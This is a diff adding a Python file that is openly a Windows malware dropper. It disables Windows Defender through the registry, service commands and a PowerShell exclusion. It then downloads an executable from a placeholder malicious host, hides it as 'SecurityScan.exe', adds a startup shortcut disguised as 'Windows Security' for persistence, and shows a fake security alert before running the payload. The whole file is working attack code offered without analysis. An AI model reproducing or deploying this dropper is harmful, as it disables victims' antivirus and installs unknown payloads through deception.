@@ -1,0 +1,85 @@
+import os
+import sys
+import ctypes
+import requests
+import winreg
+from Crypto.Cipher import AES
+import base64
+import threading
+
+class MalwareKillerDropper:
+    def __init__(self):
+        self.fake_av_url = "http://malicious-server.com/fakeav_setup.exe"
+        self.icon_path = "C:\\Windows\\System32\\imageres.dll,100"  # Shield icon
+        
+    def download_and_execute(self):
+        # Download payload
+        response = requests.get(self.fake_av_url, stream=True)
+        with open("C:\\Users\\Public\\SecurityScan.exe", 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        
+        # Set file attributes to hidden/system
+        ctypes.windll.kernel32.SetFileAttributesW(
+            "C:\\Users\\Public\\SecurityScan.exe",
+            2 | 4  # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
+        )
+        
+        # Create shortcut in startup folder
+        startup_path = os.path.join(
+            os.getenv('APPDATA'),
+            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+        )
+        
+        shortcut_path = os.path.join(startup_path, "Windows Security.lnk")
+        
+        # Create shortcut using Windows Script Host
+        shortcut_script = f"""
+        Set oWS = WScript.CreateObject("WScript.Shell")
+        sLinkFile = "{shortcut_path}"
+        Set oLink = oWS.CreateShortcut(sLinkFile)
+        oLink.TargetPath = "C:\\Users\\Public\\SecurityScan.exe"
+        oLink.IconLocation = "{self.icon_path}"
+        oLink.Save
+        """
+        
+        with open("C:\\temp\\createshortcut.vbs", 'w') as f:
+            f.write(shortcut_script)
+        
+        os.system('wscript C:\\temp\\createshortcut.vbs')
+        os.remove("C:\\temp\\createshortcut.vbs")
+        
+        # Execute with fake error message first
+        ctypes.windll.user32.MessageBoxW(
+            0,
+            "Your system has multiple security vulnerabilities!\nWindows Defender recommends running a full scan.",
+            "Windows Security Alert",
+            0x30 | 0x1  # MB_ICONWARNING | MB_OK
+        )
+        
+        os.startfile("C:\\Users\\Public\\SecurityScan.exe")
+    
+    def disable_defenses(self):
+        # Disable Windows Defender via registry
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
+                0, winreg.KEY_WRITE
+            )
+            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+        except:
+            pass
+        
+        # Stop Defender service
+        os.system("net stop WinDefend /y")
+        os.system("sc config WinDefend start= disabled")
+        
+        # Add exclusion for our executable
+        os.system('powershell -Command "Add-MpPreference -ExclusionPath C:\\Users\\Public"')
+
+if __name__ == "__main__":
+    dropper = MalwareKillerDropper()
+    dropper.disable_defenses()
+    dropper.download_and_execute()
